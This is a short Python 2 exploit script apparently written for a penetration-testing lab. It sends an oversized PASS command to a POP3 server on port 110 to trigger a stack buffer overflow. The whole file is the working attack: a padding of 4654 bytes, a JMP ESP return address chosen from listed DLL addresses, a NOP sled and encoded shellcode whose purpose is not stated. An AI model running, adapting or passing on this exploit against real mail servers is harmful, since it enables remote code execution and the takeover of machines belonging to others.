#!/usr/bin/python
import struct
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#7E3D5313   FFE4             JMP ESP

#7E3DB260   FFE4             JMP ESP

#7CB4C1F6   FFE4             JMP ESP

#7C951EED   FFE4             JMP ESP

#badchars x00, x0a, x0d

ret = '\xED\x1E\x95\x7C' 

shellcode = ("\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x2f"
"\xa5\x3b\xa5\x83\xeb\xfc\xe2\xf4\xd3\xcf\xd0\xe8\xc7\x5c\xc4\x5a"
"\xd0\xc5\xb0\xc9\x0b\x81\xb0\xe0\x13\x2e\x47\xa0\x57\xa4\xd4\x2e"
"\x60\xbd\xb0\xfa\x0f\xa4\xd0\xec\xa4\x91\xb0\xa4\xc1\x94\xfb\x3c"
"\x83\x21\xfb\xd1\x28\x64\xf1\xa8\x2e\x67\xd0\x51\x14\xf1\x1f\x8d"
"\x5a\x40\xb0\xfa\x0b\xa4\xd0\xc3\xa4\xa9\x70\x2e\x70\xb9\x3a\x4e"
"\x2c\x89\xb0\x2c\x43\x81\x27\xc4\xec\x94\xe0\xc1\xa4\xe6\x0b\x2e"
"\x6f\xa9\xb0\xd5\x33\x08\xb0\xe5\x27\xfb\x53\x2b\x61\xab\xd7\xf5"
"\xd0\x73\x5d\xf6\x49\xcd\x08\x97\x47\xd2\x48\x97\x70\xf1\xc4\x75"
"\x47\x6e\xd6\x59\x14\xf5\xc4\x73\x70\x2c\xde\xc3\xae\x48\x33\xa7"
"\x7a\xcf\x39\x5a\xff\xcd\xe2\xac\xda\x08\x6c\x5a\xf9\xf6\x68\xf6"
"\x7c\xf6\x78\xf6\x6c\xf6\xc4\x75\x49\xcd\x2a\xf9\x49\xf6\xb2\x44"
"\xba\xcd\x9f\xbf\x5f\x62\x6c\x5a\xf9\xcf\x2b\xf4\x7a\x5a\xeb\xcd"
"\x8b\x08\x15\x4c\x78\x5a\xed\xf6\x7a\x5a\xeb\xcd\xca\xec\xbd\xec"
"\x78\x5a\xed\xf5\x7b\xf1\x6e\x5a\xff\x36\x53\x42\x56\x63\x42\xf2"
"\xd0\x73\x6e\x5a\xff\xc3\x51\xc1\x49\xcd\x58\xc8\xa6\x40\x51\xf5"
"\x76\x8c\xf7\x2c\xc8\xcf\x7f\x2c\xcd\x94\xfb\x56\x85\x5b\x79\x88"
"\xd1\xe7\x17\x36\xa2\xdf\x03\x0e\x84\x0e\x53\xd7\xd1\x16\x2d\x5a"
"\x5a\xe1\xc4\x73\x74\xf2\x69\xf4\x7e\xf4\x51\xa4\x7e\xf4\x6e\xf4"
"\xd0\x75\x53\x08\xf6\xa0\xf5\xf6\xd0\x73\x51\x5a\xd0\x92\xc4\x75"
"\xa4\xf2\xc7\x26\xeb\xc1\xc4\x73\x7d\x5a\xeb\xcd\xdf\x2f\x3f\xfa"
"\x7c\x5a\xed\x5a\xff\xa5\x3b\xa5")

buffer = 4654 * '\x41' + ret + '\x90' * 32 + shellcode

print '\n Sending evil buffer...'

s.connect(('192.168.11.6',110))
data = s.recv(1024)
s.send('USER test' + '\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer +'\r\n')
data = s.recv(1024)
s.close()
print '\nDone!'

